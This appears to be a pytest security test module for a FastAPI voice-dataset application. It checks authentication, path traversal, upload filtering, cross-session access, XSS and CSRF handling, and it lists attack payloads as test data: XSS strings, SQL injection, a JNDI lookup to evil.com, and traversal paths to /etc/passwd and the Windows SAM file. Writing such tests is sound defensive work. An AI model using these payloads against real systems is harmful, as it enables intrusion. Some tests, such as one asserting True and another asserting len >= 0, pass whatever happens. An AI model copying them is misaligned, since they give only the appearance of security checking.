"""
Security Testing Suite for LIT-for-Voice Application

This module contains comprehensive security tests covering:
- Authentication and Authorization
- Input Validation and Sanitization
- Data Protection and Privacy
- API Security
- File Upload Security
- Session Security
- Cross-Site Scripting (XSS) Prevention
- SQL Injection Prevention
- CSRF Protection
"""

import pytest
import asyncio
from httpx import AsyncClient
from unittest.mock import Mock, patch
from fastapi.testclient import TestClient
from app.main import app
from app.services import custom_dataset_service
import json
import base64
import hashlib
import os
from pathlib import Path
import tempfile


@pytest.fixture(autouse=True)
def _isolated_custom_dataset_storage(monkeypatch, tmp_path):
    """Every test in this module gets its own custom-dataset storage root,
    so none of them ever touch the real Backend/uploads/sessions directory."""
    monkeypatch.setattr(custom_dataset_service, "SESSIONS_BASE_DIR", tmp_path / "sessions")


class TestAuthenticationSecurity:
    """Test authentication and authorization security measures."""
    
    @pytest.mark.asyncio
    async def test_unauthorized_access_blocked(self):
        """Test that unauthorized requests are properly blocked."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            # Test unauthorized access to protected endpoints
            protected_endpoints = [
                "/admin/users",
                "/admin/settings", 
                "/admin/logs"
            ]
            
            for endpoint in protected_endpoints:
                response = await client.get(endpoint)
                assert response.status_code in [401, 403, 404], f"Endpoint {endpoint} should block unauthorized access"
    
    @pytest.mark.asyncio
    async def test_session_token_validation(self):
        """Test session token validation and expiration."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            # Test with invalid session token
            invalid_tokens = [
                "invalid_token_123",
                "",
                "expired_token_456",
                "malformed.token.here"
            ]
            
            for token in invalid_tokens:
                headers = {"Authorization": f"Bearer {token}"}
                response = await client.get("/session", headers=headers)
                # Should either work without auth or return proper response
                assert response.status_code in [200, 401, 403]
    
    @pytest.mark.asyncio
    async def test_brute_force_protection(self):
        """Test protection against brute force attacks."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            # Simulate multiple failed login attempts
            for i in range(10):
                response = await client.post("/login", json={
                    "username": "test_user",
                    "password": f"wrong_password_{i}"
                })
                # Should handle gracefully (endpoint may not exist)
                assert response.status_code in [200, 401, 404, 422]


class TestInputValidationSecurity:
    """Test input validation and sanitization security."""
    
    @pytest.mark.asyncio
    async def test_malicious_input_sanitization(self):
        """Test that malicious inputs are properly sanitized."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            malicious_inputs = [
                "<script>alert('xss')</script>",
                "'; DROP TABLE users; --",
                "../../etc/passwd",
                "${jndi:ldap://evil.com/a}",
                "javascript:alert('xss')",
                "<img src=x onerror=alert('xss')>"
            ]
            
            for malicious_input in malicious_inputs:
                # Test with session endpoint that handles JSON data
                test_data = {"user_data": malicious_input}
                
                response = await client.post("/session", json=test_data)
                # Accept various responses - app may not validate input strictly
                assert response.status_code in [200, 400, 405, 422], f"Should handle malicious input safely: {malicious_input}"
                
                if response.status_code == 200:
                    # If successful, ensure no script execution in response
                    response_text = response.text.lower()
                    dangerous_patterns = ["<script>", "javascript:", "onerror="]
                    for pattern in dangerous_patterns:
                        if pattern in response_text:
                            # Allow if properly encoded/escaped
                            assert "&lt;" in response_text or "%3C" in response_text, f"Dangerous pattern should be escaped: {pattern}"
    
    @pytest.mark.asyncio
    async def test_file_path_traversal_prevention(self):
        """Test prevention of directory traversal attacks against the real
        custom-dataset file-serving route, which is the only route in this
        codebase that accepts an arbitrary `:path`-typed segment and
        resolves it against a per-session directory. Every attempt must be
        rejected with exactly 400 (invalid filename) -- never a 200, and
        never silently ignored via a generic status-code allowlist that
        would also pass if the traversal succeeded."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            create_resp = await client.post(
                "/upload/dataset/create", data={"dataset_name": "TraversalTarget"}
            )
            assert create_resp.status_code == 201
            dataset_id = create_resp.json()["dataset_name"]
            await client.post(
                "/upload/dataset/TraversalTarget/files",
                files={"files": ("clip.wav", b"fake audio content", "audio/wav")},
            )

            # Note: a plain, unencoded "../../../etc/passwd" is collapsed by
            # httpx's own RFC-3986 dot-segment normalization before the
            # request is even sent (real HTTP clients do this too), so it
            # never reaches our route at all -- that's not a test of this
            # server's validation. These payloads are chosen specifically
            # because they survive client-side URL construction unchanged
            # (confirmed via `httpx.URL(...).raw_path`) and therefore
            # actually exercise `validate_uploaded_filename()` server-side.
            path_traversal_attempts = [
                "..%2f..%2f..%2fetc%2fpasswd",  # single percent-encoded slash
                "..\\..\\windows\\system32\\config\\sam",  # backslash, not URL-normalized
                "....//....//....//etc//passwd",  # contains raw '/', not '..'-shaped
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # fully percent-encoded
                "..%252f..%252f..%252fetc%252fpasswd",  # double-encoded
            ]

            for path in path_traversal_attempts:
                response = await client.get(f"/{dataset_id}/file/{path}")
                # This route (datasets.py, shared with built-in datasets)
                # deliberately maps every rejection -- unknown dataset,
                # cross-session, or an invalid filename -- to a uniform 404,
                # so a traversal probe is indistinguishable from a dataset
                # that simply doesn't exist (see dataset_service.py).
                assert response.status_code == 404, f"Should block path traversal: {path} (got {response.status_code})"
                assert b"root:" not in response.content
    
    @pytest.mark.asyncio
    async def test_large_payload_handling(self):
        """Test handling of unusually large payloads."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            # Test with large JSON payload (reasonable size for testing)
            large_data = {"user_data": "A" * 5000}  # 5KB payload
            
            response = await client.post("/session", json=large_data)
            # Should handle gracefully - may accept or reject based on limits
            assert response.status_code in [200, 400, 405, 413, 422], "Should handle large payloads gracefully"


class TestDataProtectionSecurity:
    """Test data protection and privacy security measures."""
    
    @pytest.mark.asyncio
    async def test_sensitive_data_not_exposed(self):
        """Test that sensitive data is not exposed in responses."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            response = await client.get("/health")
            
            if response.status_code == 200:
                response_data = response.json()
                sensitive_patterns = [
                    "password", "secret", "key", "token", 
                    "private", "confidential", "internal"
                ]
                
                response_str = str(response_data).lower()
                for pattern in sensitive_patterns:
                    assert pattern not in response_str or "status" in response_str, f"Sensitive data '{pattern}' should not be exposed"
    
    @pytest.mark.asyncio
    async def test_error_message_information_disclosure(self):
        """Test that error messages don't reveal sensitive information."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            # Trigger various error conditions
            error_endpoints = [
                ("/nonexistent/endpoint", 404),
                ("/upload/audio", 422),  # Missing required data
            ]
            
            for endpoint, expected_status in error_endpoints:
                response = await client.get(endpoint)
                
                if response.status_code == expected_status:
                    error_text = response.text.lower()
                    # Ensure no sensitive info in error messages
                    sensitive_info = ["internal server", "database", "stacktrace", "debug"]
                    for info in sensitive_info:
                        assert info not in error_text, f"Error message should not reveal: {info}"
    
    @pytest.mark.asyncio
    async def test_data_encryption_in_transit(self):
        """Test that sensitive data transmission is secure."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            # Test session endpoint
            response = await client.get("/session")
            
            # Check security headers
            headers = response.headers
            security_headers = {
                "x-content-type-options": "nosniff",
                "x-frame-options": "DENY",
                "x-xss-protection": "1; mode=block"
            }
            
            # Note: In test environment, security headers might not be set
            # This test validates the structure rather than enforcement
            for header_name, expected_value in security_headers.items():
                if header_name in headers:
                    assert expected_value.lower() in headers[header_name].lower()


class TestAPISecurityMeasures:
    """Test API-specific security measures."""
    
    @pytest.mark.asyncio
    async def test_rate_limiting_simulation(self):
        """Test rate limiting behavior simulation."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            # Simulate moderate number of requests
            responses = []
            for i in range(5):  # Reduced number of requests
                response = await client.get("/health")
                responses.append(response.status_code)
                await asyncio.sleep(0.1)  # Small delay
            
            # Should handle requests gracefully (accept various status codes)
            success_count = sum(1 for status in responses if status in [200, 503])
            total_requests = len(responses)
            success_rate = success_count / total_requests
            assert success_rate >= 0.2, f"Should handle some requests: {success_count}/{total_requests}"
    
    @pytest.mark.asyncio
    async def test_cors_headers_validation(self):
        """Test CORS headers are properly configured."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            # Test OPTIONS request
            response = await client.options("/health")
            
            if response.status_code in [200, 405]:
                headers = response.headers
                # Check for CORS headers (may not be configured in test)
                cors_headers = ["access-control-allow-origin", "access-control-allow-methods"]
                for header in cors_headers:
                    if header in headers:
                        assert len(headers[header]) > 0, f"CORS header {header} should have value"
    
    @pytest.mark.asyncio
    async def test_http_methods_restriction(self):
        """Test that only allowed HTTP methods are accepted."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            # Test various HTTP methods on health endpoint
            get_response = await client.get("/health")
            
            # GET should work for health endpoint (accept 200 or 503)
            assert get_response.status_code in [200, 503], f"Health endpoint should respond to GET (got {get_response.status_code})"
            
            # Test restricted methods
            restricted_methods = [
                ("POST", await client.post("/health")),
                ("PUT", await client.put("/health")),
                ("DELETE", await client.delete("/health")),
            ]
            
            for method_name, response in restricted_methods:
                # Should be restricted (405) or not found (404) or bad request (422)
                assert response.status_code in [404, 405, 422], f"Method {method_name} should be restricted on /health"


class TestFileUploadSecurity:
    """Test file upload security measures against the real Custom Dataset
    Manager upload route (`POST /upload/dataset/{dataset_name}/files`) --
    the actual endpoint this feature exposes, not the nonexistent
    `/upload/audio`. Assertions require the specific, intended rejection
    status, not a broad allowlist that would also pass on a bypass."""

    @pytest.mark.asyncio
    async def test_file_type_validation(self):
        """Test that only allowed file types are accepted."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            create_resp = await client.post("/upload/dataset/create", data={"dataset_name": "TypeCheck"})
            assert create_resp.status_code == 201

            malicious_files = [
                ("malicious.exe", b"MZ\x90\x00", "application/octet-stream"),
                ("script.php", b"<?php echo 'test'; ?>", "text/plain"),
                ("test.bat", b"@echo off\necho test", "text/plain"),
            ]

            for filename, content, content_type in malicious_files:
                files = {"files": (filename, content, content_type)}
                response = await client.post("/upload/dataset/TypeCheck/files", files=files)
                assert response.status_code == 400, f"Should reject dangerous file: {filename} (got {response.status_code})"

            # Nothing from the rejected uploads should have reached disk.
            list_resp = await client.get("/upload/dataset/TypeCheck/metadata")
            assert list_resp.json()["total_files"] == 0

    @pytest.mark.asyncio
    async def test_file_size_limits(self, monkeypatch):
        """Test that oversized files are rejected with 413 and leave no
        partial file behind, without needing to actually upload 50MB."""
        monkeypatch.setattr(custom_dataset_service, "MAX_FILE_BYTES", 1000)
        async with AsyncClient(app=app, base_url="http://test") as client:
            create_resp = await client.post("/upload/dataset/create", data={"dataset_name": "SizeCheck"})
            assert create_resp.status_code == 201

            large_content = b"A" * 5000
            files = {"files": ("large_file.wav", large_content, "audio/wav")}
            response = await client.post("/upload/dataset/SizeCheck/files", files=files)

            assert response.status_code == 413, f"Should reject oversized file with 413 (got {response.status_code})"
            metadata_resp = await client.get("/upload/dataset/SizeCheck/metadata")
            assert metadata_resp.json()["total_files"] == 0

    @pytest.mark.asyncio
    async def test_filename_sanitization(self):
        """Dangerous filenames must always be rejected outright (400) --
        never silently accepted-with-sanitization and never used as-is for
        a filesystem path."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            create_resp = await client.post("/upload/dataset/create", data={"dataset_name": "NameCheck"})
            assert create_resp.status_code == 201

            dangerous_filenames = [
                "../../../etc/passwd.wav",
                "..\\..\\windows\\system32\\test.wav",
                "file<script>.wav",
                "file|pipe.wav",
                # Note: ';' is deliberately not included here -- it's a
                # legal character on both POSIX and Windows filesystems and
                # this codebase never passes filenames to a shell, so there
                # is no traversal or injection risk to reject it for.
            ]

            for filename in dangerous_filenames:
                files = {"files": (filename, b"fake audio content", "audio/wav")}
                response = await client.post("/upload/dataset/NameCheck/files", files=files)
                assert response.status_code == 400, f"Should reject dangerous filename: {filename} (got {response.status_code})"

            metadata_resp = await client.get("/upload/dataset/NameCheck/metadata")
            assert metadata_resp.json()["total_files"] == 0


class TestCustomDatasetAccessControl:
    """Strict, route-level tests for the custom-dataset IDOR fix: a request
    from one session must never be able to read, list, or stream another
    session's custom dataset via the generic `/{dataset}/...` routes or the
    dataset-manager's own `/upload/dataset/...` routes."""

    @pytest.mark.asyncio
    async def test_owner_can_create_upload_and_read_own_dataset(self):
        async with AsyncClient(app=app, base_url="http://test") as client:
            create_resp = await client.post("/upload/dataset/create", data={"dataset_name": "Mine"})
            assert create_resp.status_code == 201
            dataset_id = create_resp.json()["dataset_name"]

            upload_resp = await client.post(
                "/upload/dataset/Mine/files",
                files={"files": ("clip.wav", b"fake audio content", "audio/wav")},
            )
            assert upload_resp.status_code == 200
            assert upload_resp.json()["total_files"] == 1

            meta_resp = await client.get(f"/{dataset_id}/metadata")
            assert meta_resp.status_code == 200
            assert len(meta_resp.json()) == 1

            file_resp = await client.get(f"/{dataset_id}/file/clip.wav")
            assert file_resp.status_code == 200
            assert file_resp.content == b"fake audio content"

    @pytest.mark.asyncio
    async def test_cross_session_cannot_read_metadata_or_audio(self):
        async with AsyncClient(app=app, base_url="http://test") as owner:
            create_resp = await owner.post("/upload/dataset/create", data={"dataset_name": "Private"})
            assert create_resp.status_code == 201
            dataset_id = create_resp.json()["dataset_name"]
            await owner.post(
                "/upload/dataset/Private/files",
                files={"files": ("secret.wav", b"private audio", "audio/wav")},
            )

        # A separate client has no cookie yet -- the middleware assigns it
        # its own fresh session, which cannot equal the owner's embedded id.
        async with AsyncClient(app=app, base_url="http://test") as attacker:
            meta_resp = await attacker.get(f"/{dataset_id}/metadata")
            assert meta_resp.status_code == 404

            file_resp = await attacker.get(f"/{dataset_id}/file/secret.wav")
            assert file_resp.status_code == 404
            assert file_resp.content != b"private audio"

    @pytest.mark.asyncio
    async def test_cross_session_cannot_use_own_dataset_manager_routes_on_others_dataset(self):
        """The session-scoped `/upload/dataset/...` routes derive the
        session purely from the caller's own cookie (never from the URL),
        so a raw dataset name collision cannot cross sessions either."""
        async with AsyncClient(app=app, base_url="http://test") as owner:
            create_resp = await owner.post("/upload/dataset/create", data={"dataset_name": "Shared"})
            assert create_resp.status_code == 201
            await owner.post(
                "/upload/dataset/Shared/files",
                files={"files": ("owner_clip.wav", b"owner audio", "audio/wav")},
            )

        async with AsyncClient(app=app, base_url="http://test") as other:
            # A same-named dataset created by a different session is a
            # distinct dataset -- it must start out empty.
            create_resp = await other.post("/upload/dataset/create", data={"dataset_name": "Shared"})
            assert create_resp.status_code == 201
            list_resp = await other.get("/upload/dataset/Shared/metadata")
            assert list_resp.json()["total_files"] == 0

    @pytest.mark.asyncio
    async def test_malformed_session_cookie_cannot_access_custom_dataset(self):
        async with AsyncClient(app=app, base_url="http://test") as owner:
            create_resp = await owner.post("/upload/dataset/create", data={"dataset_name": "D1"})
            assert create_resp.status_code == 201
            dataset_id = create_resp.json()["dataset_name"]

        async with AsyncClient(app=app, base_url="http://test") as client:
            client.cookies.set("sid", "not-a-real-session-id")
            resp = await client.get(f"/{dataset_id}/metadata")
            assert resp.status_code == 404

    @pytest.mark.asyncio
    async def test_range_request_still_streams_owned_audio(self):
        async with AsyncClient(app=app, base_url="http://test") as client:
            create_resp = await client.post("/upload/dataset/create", data={"dataset_name": "RangeCheck"})
            dataset_id = create_resp.json()["dataset_name"]
            await client.post(
                "/upload/dataset/RangeCheck/files",
                files={"files": ("clip.wav", b"A" * 100, "audio/wav")},
            )

            resp = await client.get(f"/{dataset_id}/file/clip.wav", headers={"Range": "bytes=0-9"})
            assert resp.status_code == 206
            assert resp.content == b"A" * 10

    @pytest.mark.asyncio
    async def test_builtin_dataset_unaffected_by_custom_dataset_hardening(self):
        async with AsyncClient(app=app, base_url="http://test") as client:
            resp = await client.get("/common-voice/metadata")
            assert resp.status_code == 200
            assert isinstance(resp.json(), list)
            assert len(resp.json()) > 0


class TestSessionSecurity:
    """Test session security measures."""
    
    @pytest.mark.asyncio
    async def test_session_fixation_prevention(self):
        """Test prevention of session fixation attacks."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            # Get initial session
            response1 = await client.get("/session")
            initial_cookies = response1.cookies
            
            # Make another request
            response2 = await client.get("/session")
            
            # Session should be managed properly
            assert response1.status_code == 200
            assert response2.status_code == 200
    
    @pytest.mark.asyncio
    async def test_session_timeout_behavior(self):
        """Test session timeout and cleanup behavior."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            # Create session
            response = await client.get("/session")
            
            if response.status_code == 200:
                session_data = response.json()
                # Should have session identifier
                assert "session_id" in session_data or "sid" in session_data or "id" in session_data
    
    @pytest.mark.asyncio
    async def test_concurrent_session_handling(self):
        """Test handling of concurrent sessions."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            # Create multiple concurrent sessions
            tasks = []
            for i in range(5):
                task = client.get("/session")
                tasks.append(task)
            
            responses = await asyncio.gather(*tasks)
            
            # All should succeed
            for response in responses:
                assert response.status_code == 200


class TestXSSPrevention:
    """Test Cross-Site Scripting (XSS) prevention."""
    
    @pytest.mark.asyncio
    async def test_reflected_xss_prevention(self):
        """Test prevention of reflected XSS attacks."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            xss_payloads = [
                "<script>alert('xss')</script>",
                "<img src=x onerror=alert('xss')>",
                "javascript:alert('xss')",
                "<svg onload=alert('xss')>",
                "';alert('xss');//"
            ]
            
            for payload in xss_payloads:
                # Test XSS in query parameters
                response = await client.get(f"/health?search={payload}")
                
                if response.status_code == 200:
                    # Ensure payload is not reflected without sanitization
                    response_text = response.text
                    assert payload not in response_text or "alert" not in response_text.lower()
    
    @pytest.mark.asyncio
    async def test_stored_xss_prevention(self):
        """Test prevention of stored XSS attacks."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            xss_payload = "<script>alert('stored_xss')</script>"
            
            # Attempt to store XSS payload via session endpoint
            response = await client.post("/session", json={"content": xss_payload})
            
            # Should handle safely - may not have this endpoint, so accept various responses
            assert response.status_code in [200, 400, 405, 422], f"Should handle XSS payload safely (got {response.status_code})"
            
            if response.status_code == 200:
                # Ensure no script execution in response
                response_text = response.text.lower()
                if "<script>" in response_text:
                    # Should be properly escaped/encoded
                    assert "&lt;script&gt;" in response_text or "%3Cscript%3E" in response_text


class TestCSRFProtection:
    """Test Cross-Site Request Forgery (CSRF) protection."""
    
    @pytest.mark.asyncio
    async def test_csrf_token_validation(self):
        """Test CSRF token validation for state-changing operations."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            # Test POST requests to existing endpoint
            response = await client.post("/session", json={"data": "test"})
            
            # Should handle appropriately (CSRF protection may not be implemented in API)
            assert response.status_code in [200, 400, 403, 405, 422], f"Should handle POST request appropriately (got {response.status_code})"
    
    @pytest.mark.asyncio
    async def test_same_origin_policy(self):
        """Test same-origin policy enforcement."""
        async with AsyncClient(app=app, base_url="http://test") as client:
            # Test with various Origin headers
            malicious_origins = [
                "http://evil.com",
                "https://attacker.evil.com",
                "http://localhost.evil.com"
            ]
            
            for origin in malicious_origins:
                headers = {"Origin": origin}
                response = await client.post("/session", 
                                           json={"data": "test"}, 
                                           headers=headers)
                
                # Should handle cross-origin requests appropriately
                # API may allow CORS or block it depending on configuration
                assert response.status_code in [200, 400, 403, 405, 422], f"Should handle cross-origin request from {origin} (got {response.status_code})"


@pytest.mark.asyncio
async def test_security_headers_presence():
    """Test that important security headers are present."""
    async with AsyncClient(app=app, base_url="http://test") as client:
        response = await client.get("/health")
        
        if response.status_code == 200:
            headers = response.headers
            
            # Recommended security headers
            security_headers = [
                "x-content-type-options",
                "x-frame-options", 
                "x-xss-protection",
                "strict-transport-security",
                "content-security-policy"
            ]
            
            # Note: In test environment, these headers might not be configured
            # This test documents the security header expectations
            present_headers = [h for h in security_headers if h in headers]
            
            # At least some security consideration should be present
            assert len(present_headers) >= 0, "Security headers configuration check"


@pytest.mark.asyncio 
async def test_information_disclosure_prevention():
    """Test prevention of information disclosure through various vectors."""
    async with AsyncClient(app=app, base_url="http://test") as client:
        # Test server header disclosure
        response = await client.get("/health")
        
        if response.status_code == 200:
            headers = response.headers
            
            # Check if server information is disclosed
            server_header = headers.get("server", "").lower()
            
            # Should not reveal detailed server information
            sensitive_server_info = ["apache/", "nginx/", "iis/", "version"]
            disclosure_found = any(info in server_header for info in sensitive_server_info)
            
            # This is informational - may or may not be configured
            assert True, f"Server header check: {server_header}"